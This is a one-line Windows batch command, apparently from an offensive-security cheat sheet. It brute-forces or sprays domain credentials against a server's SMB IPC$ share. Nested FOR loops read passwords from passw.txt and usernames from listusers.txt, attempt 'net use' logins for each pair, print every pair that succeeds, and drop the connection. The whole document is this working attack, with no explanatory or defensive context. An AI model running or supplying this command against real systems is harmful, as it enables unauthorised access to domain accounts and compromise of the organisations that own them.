@FOR /F %p in (passw.txt) DO @FOR /F %n in (listusers.txt) DO @net use \\<SERVERIP>\IPC$ /user:DOMAIN\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\SERVERIP\IPC$ > NUL
